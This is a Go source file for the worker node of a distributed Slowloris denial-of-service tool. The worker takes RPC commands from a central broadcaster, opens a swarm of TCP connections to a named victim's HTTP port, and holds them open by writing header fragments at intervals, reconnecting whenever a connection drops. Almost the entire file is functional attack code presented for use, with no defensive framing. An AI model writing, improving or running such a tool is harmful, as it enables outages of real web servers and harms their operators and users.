package main

import (
  "fmt"
  "net"
  "net/rpc"
  "time"
  "Distributed-Slow-Loris/shared"
  "strconv"
  "log"
)

// FUNC (s *State) SetState(req *) return 0 always (just a setter)

// FUNC () return 0 if swarm successfully created, -1 if state is not set, 1 otherwise

// worker node structure, will bind RPC methods to this structure
type Worker struct {
      Port            int
      listener        net.Listener
      WorkerHeaders   *shared.Headers
      WorkerState     *shared.State
      WorkerAttackers []*shared.Attacker
      doneChan        chan int
}

// set headers for worker as specified by broadcaster, always return nil error
func (worker *Worker) SetHeaders(req *shared.Headers, res *int) error {
  worker.WorkerHeaders = req
  fmt.Println("HEADERS SET")
  return nil
}

func (worker *Worker) SetState(req *shared.State, res *int) error {
  worker.WorkerState = req
  fmt.Println("STATE SET")
  return nil
}

func (worker *Worker) Attack(req int, res *int) error {
  // display slow loris attack information
  announceAttack(worker.WorkerState)

  // create a swarm of attackers, to execute slow loris attacks
  worker.WorkerAttackers = createSwarm(worker.WorkerState.NumAttackers, worker.WorkerState.Endpoint)

  // dispatch goroutines to initiate attacks with each attacker in swarm
  for _, attacker := range worker.WorkerAttackers {
    go loris(attacker, worker.WorkerState.Delay, worker.WorkerHeaders.Base, worker.WorkerHeaders.Loris, worker.WorkerState.Endpoint)
  }

  // dispatch goroutine to display stats
  go func() {
    for {
      // display system stats, waiting each time for the next round
      // of server writes
      time.Sleep(time.Duration(worker.WorkerState.Delay) * time.Second)
      displayStats(worker.WorkerAttackers)
    }
  }()
  fmt.Println("blocked on doneChan")

  // block Attack() until client has called Terminate()
  <-worker.doneChan
  return nil
}

// unblocks Attack() by sending value to doneChan, this way client can
// asynchronously execute Attack() to initiate attack, and later on be able
// to call Terminate() to unblock Attack()
func (worker *Worker) Terminate(req int, res *int) error {
  *res = 0
  worker.doneChan<-1
  return nil
}

// initialize and return a pointer to a worker object
func Initialize() *Worker {
  // create unbuffered blocking doneChan, will be used to block Attack()
  // from exiting until value sent to channel by Terminate()
  worker := &Worker{Port: 3000, doneChan: make(chan int)}
  return worker
}

func Connect(worker *Worker) {
  var err error
  // intialize worker net listener on port 3000
  worker.listener, err = net.Listen("tcp", ":"+strconv.Itoa(worker.Port))

  if err != nil { // error checking
    log.Fatal("RPC listen error:", err)
  } else {
    fmt.Println("waiting on requests from broadcast")
  }
}

const version = 0.2

func main() {
  // create worker structure
  worker := Initialize()
  // register worker as exported type
  rpc.Register(worker)

  // initialize worker net listener, and listen for traffic on specified Port
  Connect(worker)

  // accept RPC to net listener for specified host Port
  rpc.Accept(worker.listener)
}

// displays stats about the slow loris
func displayStats(swarm []*shared.Attacker) {
  var numActive, numErrors, numWrites int
  for i := 0; i < len(swarm); i++ {
    numActive += swarm[i].Active
    numErrors += swarm[i].Errors
    numWrites += swarm[i].Writes
  }
  fmt.Println("=====================")
  fmt.Println("total writes:", numWrites)
  fmt.Println("total errors:", numErrors)
  fmt.Println("total active threads:", numActive)
}

// writes some data to a specified connection object
func writeEndpoint(conn net.Conn, message []byte) error {
  _, err := conn.Write(message)
  return err
}

// creates a slice of attacker structures of the specified size, and for the
// specified endpoint
func createSwarm(numAttackers int, endpoint string) []*shared.Attacker {
  swarm := make([]*shared.Attacker, 0)
  // use doneChan to wait on goroutines that create attackers
  doneChan := make(chan int, 0)
  // create specified number of connection sockets, one per attacker
  for i := 0; i < numAttackers; i++ {
    // dispatch goroutines to create each attacker
    go func(i int) {
      conn := createAttacker(endpoint)
      fmt.Println("attacker",i,"created")
      swarm = append(swarm, &shared.Attacker{Id: i, Conn: conn, Active: 1, Errors: 0, Writes: 0})
      doneChan<- 1
    }(i)
  }

  for i := 0; i < numAttackers; i++ {
    <-doneChan
  }
  fmt.Println("Swarm of", numAttackers, "threads created.")
  return swarm
}

// repeatadly attempts to create a connection object for a given endpoint
// until connection initiation is successful, returns resulting connection
func createAttacker(endpoint string) net.Conn {
  conn, err := net.Dial("tcp", endpoint+":http")
  // attempt to establish connection until successful
  for err != nil {
    fmt.Println("failed to establish connection to", endpoint, "trying again now...")
    conn, err = net.Dial("tcp", endpoint+":http")
  }
  return conn
}

// this function implements the slow loris attack, repeatadly writing to
// the server for a given attacker connection, and
func loris(worker *shared.Attacker, delay int, base []byte, header []byte, endpoint string) {
  // initiate server request
  if err := writeEndpoint(worker.Conn, base); err != nil {
    fmt.Println("attacker", worker.Id, "failed to write to server")
  }
  // continuously write to server to prolong request
  for {
    time.Sleep(time.Duration(delay) * time.Second)
    if err := writeEndpoint(worker.Conn, header); err != nil {
      worker.Errors += 1
      worker.Active = 0
      fmt.Println("error with repeat header, establishing connection #",worker.Errors)
      worker.Conn = createAttacker(endpoint)
      worker.Active = 1
    } else {
      worker.Writes += 1
    }
  }
}

// utility function, prints details about attack
func announceAttack(attackState *shared.State) {
  fmt.Println("==========================================")
  fmt.Println("AASHRAY'S SLOW LORIS ATTACKER Version", version)
  fmt.Println("      VICTIM OF ATTACK:", attackState.Endpoint)
  fmt.Println("      NUMBER OF ATTACKERS:", attackState.NumAttackers)
  fmt.Println("      DELAY BETWEEN EACH WRITE:", attackState.Delay)
  fmt.Println("      TIMEOUT (0 -> NO TIMEOUT):", attackState.Timeout)
  fmt.Println("==========================================")
}
